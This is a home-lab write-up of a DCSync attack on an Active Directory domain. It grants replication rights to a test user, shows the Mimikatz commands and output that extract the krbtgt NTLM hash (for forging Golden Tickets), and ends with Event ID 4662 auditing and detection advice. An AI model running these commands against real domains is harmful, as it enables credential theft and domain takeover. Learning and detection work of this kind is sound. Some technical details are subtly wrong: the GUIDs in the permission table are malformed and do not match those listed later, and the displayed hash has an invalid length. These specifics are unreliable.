# DCSync Attack — AD Lab Report

**Lab Environment:** `salkaev.local` (Windows Server Active Directory Domain Controller)

**Target Account:** `krbtgt` (Kerberos service account)

**Tools Used:** Active Directory PowerShell Module, Mimikatz, Auditpol, Elastic Security (for detection)

---

## Objective

Simulate a DCSync attack in an isolated Active Directory home lab, assign the required replication permissions to a low-privileged user (`attacker`), extract the NTLM hash of the `krbtgt` account using Mimikatz, and enable directory service auditing (Event ID 4662) to detect such attacks.

---

## Background

**DCSync** is a technique that allows an attacker with sufficient privileges to impersonate a domain controller and request replication of directory data, including password hashes of all domain users. To perform the attack, the attacker needs the following extended rights on the domain object:

- `Replicating Directory Changes`
- `Replicating Directory Changes All`
- `Replicating Directory Changes In Filtered Set`

These rights are typically assigned only to domain controllers and some administrative accounts. In this lab, we deliberately grant them to the `attacker` user to demonstrate the attack mechanism.

Detecting DCSync is possible by monitoring **Event ID 4662** (Directory Service Access) with specific extended rights GUIDs, which reveals unauthorized replication requests.

---

## Step 1 — Create the `attacker` User

A new domain user `attacker` was created in the `IT` organizational unit using the **Active Directory Users and Computers** snap-in.

![Create attacker user](screenshots/01_create_user.png)

**Account Details:**

- **First name:** attacker
- **Last name:** attacker
- **Full name:** attacker attacker
- **User logon name:** `attacker@salkaev.local`
- **Pre-Windows 2000 logon name:** `SALKAEV\attacker`

---

## Step 2 — Assign DCSync Permissions via GUI

To enable the `attacker` user to perform directory replication, three extended rights were assigned on the domain object. The configuration was done through the domain properties:

1. Enabled **Advanced Features** in ADUC.
2. Opened **Domain Properties → Security → Advanced**.
3. Added the `attacker` user and, under the **Extended Permissions** tab, checked:
   - `Replicating Directory Changes`
   - `Replicating Directory Changes All`
   - `Replicating Directory Changes In Filtered Set`

![Grant DCSync permissions](screenshots/02_grant_permissions.png)

The screenshot confirms that the `attacker` user received `Allow` permissions for all three extended rights, applied to the entire domain object and all descendants.

---

## Step 3 — Verify Permissions via PowerShell

To confirm the permissions were correctly applied, a PowerShell script was executed to list the Access Control Entries (ACEs) for the domain object that reference the `attacker` user.

```powershell
$domainDN = (Get-ADDomain).DistinguishedName
(Get-Acl "AD:\$domainDN").Access | Where-Object {$_.IdentityReference -match "attacker"} | Format-Table IdentityReference, ActiveDirectoryRights, ObjectType
```

![PowerShell verification](screenshots/03_powershell_check.png)

The output shows that `SALKAEV\attacker` has the following extended rights:

| IdentityReference   | ActiveDirectoryRights | ObjectType                           |
|---------------------|------------------------|--------------------------------------|
| SALKAEV\attacker    | ExtendedRight          | 1131f6ad-9c07-11d1-f79f-00c04fc2dd2 |
| SALKAEV\attacker    | ExtendedRight          | 89e95b76-4d4d-4c62-991a-0facbeda640c|
| SALKAEV\attacker    | ExtendedRight          | 1131f6aa-9c07-11d1-f79f-00c04fc2dd2 |
| SALKAEV\attacker    | ExtendedRight          | 1131f6ab-9c07-11d1-f79f-00c04fc2dd2 |

The first GUID (`1131f6ad...`) is not critical; the other three match the required DCSync rights.

---

## Step 4 — Execute DCSync Attack with Mimikatz

With the `Replicating Directory Changes` rights in place, Mimikatz was run on a client machine (or on the domain controller itself) to extract the `krbtgt` account data.

```cmd
mimikatz.exe
privilege::debug
lsadump::dcsync /domain:salkaev.local /user:krbtgt
```

Initially, the attack failed with the following error:

```
ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x00002105 (8453)
```

This was likely due to a delay in permission propagation. After a second attempt (possibly after a domain controller reboot or waiting for replication), the attack succeeded.

![Mimikatz DCSync success](screenshots/04_mimikatz_success.png)

Mimikatz successfully retrieved the `krbtgt` account details:

```
SAM Username    : krbtgt
Account Type    : 30000000 ( USER_OBJECT )
User Account Control    : 00000202 ( ACCOUNTDISABLE_NORMAL_ACCOUNT )
Password last change    : 25.06.2026 11:43:28
Object Security ID    : S-1-5-21-1041245020-857719083-3551066421-502

Credentials:
  Hash NTLM: 94de443d39f7f030927544bddfbcf95bd
  ntlm-0: 94de443d39f7f030927544bddfbcf95bd
  lm-0: 889688b0f6bd1246222d1f30ebd9d721
```

The NTLM hash of the `krbtgt` account was successfully extracted. This hash can be used to forge **Golden Tickets** and obtain persistent, unrestricted access to the domain.

---

## Step 5 — Enable Auditing for DCSync Detection

To log directory service access events (Event ID 4662), auditing for the **Directory Service Access** subcategory was enabled.

```powershell
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /get /subcategory:"Directory Service Access"
```

![Auditpol configuration](screenshots/05_auditpol_config.png)

Now any operation using the DCSync extended rights will be logged in the domain controller’s Security event log. Event ID 4662 contains information about the requested access, including the object GUID, and can be used to build correlation rules for detecting unauthorized replication attempts.

---

## Result

The lab successfully demonstrated:

1. Creation of the `attacker` user in Active Directory.
2. Assignment of the extended rights `Replicating Directory Changes`, `Replicating Directory Changes All`, and `Replicating Directory Changes In Filtered Set` to the `attacker` user.
3. Verification of the permissions using PowerShell.
4. Successful extraction of the `krbtgt` NTLM hash using Mimikatz (DCSync attack).
5. Configuration of auditing to log Event ID 4662, enabling detection of such attacks.

---

## Detection Recommendations

1. **Monitor Event ID 4662:** Track directory service access events that target replication. Focus on the following extended rights GUIDs:
   - `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (Replicating Directory Changes)
   - `1131f6ab-9c07-11d1-f79f-00c04fc2dcd2` (Replicating Directory Changes All)
   - `89e95b76-444d-4c62-991a-0facbeda640c` (Replicating Directory Changes In Filtered Set)

2. **Correlate with Unusual Accounts:** Alerts should be raised when these events are triggered by non-domain-controller or non-administrative accounts.

3. **Audit Permission Changes:** Regularly audit who has replication rights using PowerShell or custom scripts.

4. **SIEM Integration:** Implement rules that correlate multiple DCSync requests from a single source within a short time window.

---

## Environment

- **Domain:** `salkaev.local`
- **Domain Controller:** `ADDC01.salkaev.local (192.168.10.7)`
- **Attack Tool:** Mimikatz 2.2.0
- **Detection Platform:** Windows Event Logs + Elastic Security (integration possible)
- All activities were performed exclusively within an isolated Active Directory home lab environment.